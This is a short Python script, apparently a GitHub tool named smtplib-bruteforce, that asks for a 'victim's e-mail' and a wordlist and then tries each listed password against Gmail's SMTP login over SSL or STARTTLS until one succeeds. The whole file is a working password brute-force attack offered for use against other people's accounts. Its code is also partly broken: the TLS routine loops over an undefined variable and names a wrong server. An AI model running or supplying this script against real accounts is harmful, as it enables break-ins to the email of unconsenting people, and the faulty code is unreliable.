#!/usr/bin/python3
# -*- coding: utf-8 -*-

import smtplib
import string
## from itertools import combinations, permutations

# ---------------------------------------------------------------------------- #
#                              tls is failed                                   #
# ---------------------------------------------------------------------------- #

def trial_without_ssl(mail_user, mail_pass): 
    print("[+] trial_without_ssl function is running...")
    smtp = smtplib.SMTP("smtp.google.com", 587)
    smtp.ehlo()
    smtp.starttls()
    
    #doesnt have to manually close file
    with open(mail_pass, 'r') as f:
        file_contents = f.read()
    
    words = file_contents.split(' ')
     
    for password in opf:
        try:
            smtp.login(mail_user, password)
            print("password for "+ mail_user + " is " + password)
            return True
        except smtplib.SMTPAuthenticationError:
            print(password + " is incorrect")
    smtp.close()

# ---------------------------------------------------------------------------- #
#                                 ssl is passed                                #
# ---------------------------------------------------------------------------- #

def trial_with_ssl(mail_user, mail_pass):
    print("[+] trial_with_ssl function is running...")
    server_ssl = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    server_ssl.ehlo()  ## optional, called by login()

    #doesnt have to manually close file
    with open(mail_pass, 'r') as f:
        file_contents = f.read()
        
    words = file_contents.split(' ')
    
    for password in words:
        try:
            server_ssl.login(mail_user, password)
            print("password for " + mail_user + " is " + password)
            return True
        except smtplib.SMTPAuthenticationError:
            print(password + " is incorrect")
    server_ssl.close()

# ---------------------------------------------------------------------------- #
#                                 MAIN FUNCTION                                #
# ---------------------------------------------------------------------------- #

def main():
    print(' ')
    print('#### -*-  github.com/oguzhanlarca/smtplib-bruteforce/smtpforce.py -*- ####')
    print('--------------------------------------------------------------------------')
        
    mail_user = str(input("Victim's e-mail: "))
    mail_pass = str(input("Wordlist name: "))
    
    mail_ssl = "ssl"
    mail_ssl = str(input("Protocol (ssl/tls): "))
    if mail_ssl == "ssl":
        trial_with_ssl(mail_user, mail_pass)
    elif mail_ssl == "tls":
        trial_without_ssl(mail_user, mail_pass)
    else:
        print("cannot be blank")
       
       
        
if __name__ == "__main__":
  main()
